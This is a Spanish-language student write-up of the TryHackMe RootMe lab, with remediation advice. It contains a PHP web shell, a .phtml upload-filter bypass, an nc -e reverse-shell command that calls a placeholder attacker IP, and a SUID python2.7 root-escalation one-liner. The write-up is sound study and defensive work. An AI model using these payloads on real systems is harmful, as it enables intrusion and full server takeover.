# Informe Técnico — RootMe (TryHackMe)

**Ramo:** Diseño de Arquitecturas de Seguridad TI
**Autor:** Lucas Orrego
**Plataforma:** [TryHackMe — RootMe](https://tryhackme.com/room/rrootme)

## 1. Objetivo y descripción del laboratorio

El objetivo de esta actividad fue resolver la máquina **RootMe** de TryHackMe, aplicando una metodología completa de pentesting: reconocimiento, enumeración, explotación web, obtención de acceso remoto y escalada de privilegios, documentando cada etapa con fines académicos y dentro de un entorno autorizado.

## 2. Herramientas utilizadas

| Herramienta | Uso |
|---|---|
| `nmap` | Escaneo de puertos y detección de servicios/versiones |
| `gobuster` | Enumeración de directorios y archivos web |
| Navegador web | Interacción manual con el panel de subida de archivos y ejecución de la web shell |
| `netcat (nc)` | Listener para recibir la reverse shell |
| Web shell en PHP | Ejecución remota de comandos vía parámetro `cmd` |
| `python3` / `python2.7` | Estabilización de TTY y vector de escalada de privilegios |

## 3. Metodología y etapas

### 3.1 Reconocimiento (nmap)

```bash
nmap -sC -sV -p- -oN nmap_rootme.txt <IP_VICTIMA>
```

Resultado: dos puertos abiertos.

| Puerto | Servicio | Versión |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80 | HTTP | Apache 2.4.41 (Ubuntu) — sitio "HackIT - Home" |

Ninguna de las dos versiones presentaba vulnerabilidades no autenticadas explotables directamente, por lo que el vector de entrada se buscó en la aplicación web del puerto 80.

*Evidencia: `01-nmap-escaneo.png`*

### 3.2 Enumeración web (gobuster)

```bash
gobuster dir -u http://<IP_VICTIMA> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o gobuster_rootme.txt
```

Se identificaron rutas relevantes: `/panel` (formulario de subida de archivos) y `/uploads` (carpeta de destino de los archivos subidos), además de `/css`, `/js` e `index.php`.

### 3.3 Reconocimiento manual del panel

Al acceder a `/panel/`, se encontró un formulario de subida de archivos **sin ningún mecanismo de autenticación**. Al acceder a `/uploads/`, se confirmó que el **listado de directorio (directory listing) estaba habilitado**, exponiendo el contenido de la carpeta a cualquier visitante.

*Evidencia: `02-panel-sin-login.png`, `03-uploads-directory-listing.png`*

### 3.4 Explotación: bypass de filtro de subida de archivos

Se intentó subir una web shell básica en PHP:

```bash
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
```

El servidor rechazó el archivo con el mensaje *"PHP não é permitido!"*, indicando un filtro por extensión de tipo **blacklist**.

*Evidencia: `04-upload-rechazado-php.png`*

Se probó con una extensión alternativa que Apache/PHP también interpreta como código ejecutable:

```bash
cp shell.php shell.phtml
```

El archivo `shell.phtml` fue aceptado sin problema, confirmando que el filtro solo bloqueaba la cadena `.php` y no validaba el contenido real del archivo.

*Evidencia: `05-upload-exitoso-phtml.png`*

### 3.5 Confirmación de ejecución remota de comandos (RCE)

Se accedió directamente al archivo subido con un parámetro de comando:

```
http://<IP_VICTIMA>/uploads/shell.phtml?cmd=id
http://<IP_VICTIMA>/uploads/shell.phtml?cmd=whoami
```

Resultado: `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — RCE confirmado como el usuario del servicio web.

*Evidencia: `06-rce-cmd-id.png`, `07-rce-cmd-whoami.png`*

### 3.6 Obtención de reverse shell

Se dejó un listener preparado en la máquina atacante:

```bash
nc -lvnp 4444
```

Y se invocó, a través del mismo RCE, una conexión de vuelta:

```
http://<IP_VICTIMA>/uploads/shell.phtml?cmd=nc%20-e%20/bin/bash%20<IP_ATACANTE>%204444
```

La conexión fue recibida exitosamente en el listener, obteniendo una shell interactiva como `www-data`.

*Evidencia: `08-listener-nc-activo.png`, `09-reverse-shell-recibida.png`*

### 3.7 Estabilización de la shell (TTY upgrade)

Para obtener una shell completamente funcional (con autocompletado, historial y control de señales), se aplicó el procedimiento estándar de upgrade de TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (pausar en background, volver a la terminal local)
stty raw -echo; fg
# Enter x2 para recuperar el prompt
```

*Evidencia: `11-shell-estabilizada.png`*

### 3.8 Enumeración de privilegios

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

`sudo -l` requería contraseña (no disponible, descartado). El `find` de binarios SUID reveló un hallazgo anómalo: **`/usr/bin/python2.7` con el bit SUID activado**, algo que no corresponde a una configuración estándar de Ubuntu. `getcap` no arrojó vectores adicionales explotables.

*Evidencia: `12-enum-sudo-suid.png`, `13-enum-getcap.png`*

### 3.9 Escalada de privilegios

Aprovechando el SUID mal configurado en `python2.7`:

```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

El flag `-p` evita que la shell descarte los privilegios heredados al iniciar. El prompt cambió de `$` a `#`, confirmando acceso como `root`.

*Evidencia: `14-privesc-ejecutado.png`, `15-privesc-confirmado-root.png`*

### 3.10 Captura de evidencias (flags)

```bash
find / -iname "user.txt" 2>/dev/null   # → /var/www/user.txt
find / -iname "root.txt" 2>/dev/null   # → /root/root.txt
cat /var/www/user.txt
cat /root/root.txt
```

Ambas flags fueron obtenidas exitosamente (no se incluyen completas en este documento por buenas prácticas de confidencialidad).

*Evidencia: `16-root-flag.png`, `18-user-flag.png`*

## 4. Vulnerabilidades encontradas e impacto

| # | Vulnerabilidad | Cómo se detectó | Condiciones que permitieron la explotación | Impacto en un entorno real |
|---|---|---|---|---|
| 1 | Subida de archivos sin validación real de tipo (Unrestricted File Upload) | Prueba manual subiendo `shell.php`, luego bypass con `shell.phtml` | Panel sin autenticación + filtro basado en blacklist de extensión en vez de validación de contenido (MIME type / magic bytes) | Ejecución remota de código (RCE) con los privilegios del servicio web; compromiso inicial completo del servidor |
| 2 | *Directory Listing* habilitado en `/uploads/` | Acceso directo a la carpeta vía navegador | Configuración de Apache sin `Options -Indexes` | Exposición de archivos subidos por otros usuarios o por el propio atacante, facilitando el descubrimiento de shells o datos sensibles |
| 3 | Binario `python2.7` con bit SUID mal configurado | `find / -perm -4000` | Permiso SUID asignado incorrectamente a un intérprete con capacidad de ejecutar comandos arbitrarios | Escalada de privilegios local de usuario de servicio a `root`; compromiso total del sistema |
| 4 | Ausencia de control de acceso en el panel de administración (`/panel`) | Acceso directo sin credenciales | No se implementó autenticación en la ruta | Cualquier visitante no autenticado puede interactuar con funcionalidad crítica (subida de archivos) |

## 5. Remediaciones recomendadas

1. **Validación de archivos subidos:** no confiar en la extensión del archivo. Validar el tipo MIME real y los "magic bytes" del contenido, usar listas blancas estrictas (whitelist) de extensiones permitidas, y almacenar los archivos subidos fuera del directorio web raíz (o con permisos de ejecución deshabilitados).
2. **Desactivar Directory Listing:** agregar `Options -Indexes` en la configuración de Apache para el directorio `/uploads` (y cualquier otro directorio de archivos subidos por usuarios).
3. **Revisar y corregir permisos SUID:** auditar periódicamente los binarios con bit SUID (`find / -perm -4000`) y remover el bit de cualquier binario que no lo requiera explícitamente, especialmente intérpretes como `python2.7`.
4. **Autenticación y control de acceso:** implementar autenticación obligatoria para cualquier panel de administración o funcionalidad sensible, y aplicar el principio de mínimo privilegio a los procesos del servidor web.
5. **Actualización de servicios:** aunque OpenSSH y Apache no presentaron vulnerabilidades críticas en este caso, mantener los servicios actualizados reduce la superficie de ataque general.

## 6. Conclusiones y aprendizajes

Este laboratorio permitió aplicar de forma práctica una cadena de explotación completa, desde el reconocimiento inicial hasta la escalada de privilegios a root. El hallazgo más relevante fue cómo un control de seguridad aparentemente válido (el filtro de extensión `.php`) resultó insuficiente por no validar el contenido real del archivo, lo que habilitó la ejecución remota de código. Asimismo, quedó en evidencia cómo una mala configuración de permisos a nivel de sistema (SUID en `python2.7`) puede anular por completo cualquier protección a nivel de aplicación. El ejercicio reforzó la importancia de la defensa en profundidad: ninguna capa de seguridad debe considerarse suficiente por sí sola.

## 7. Evidencias

Todas las capturas de pantalla referenciadas en este informe se encuentran en la carpeta [`/evidencias`](./evidencias) de este repositorio.
